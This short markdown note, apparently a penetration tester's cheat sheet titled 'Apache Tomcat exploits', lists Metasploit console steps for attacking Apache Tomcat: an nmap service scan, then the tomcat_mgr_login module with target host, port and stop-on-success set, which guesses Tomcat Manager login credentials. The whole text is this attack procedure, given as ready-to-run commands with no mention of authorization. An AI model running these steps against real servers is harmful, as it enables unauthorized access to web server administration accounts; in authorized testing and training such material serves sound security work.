# Apache Tomcat exploits
- msfconsole
- nmap -sV [network] (if you find Apache Tomcat)
- search tomcat
- use auxiliary/scanner/http/tomcat_mgr_login
- show options
- set RHOSTS [target-ip-addr]
- set RPORT [target-service-port]
- set STOP_ON_SUCCESS true
- run
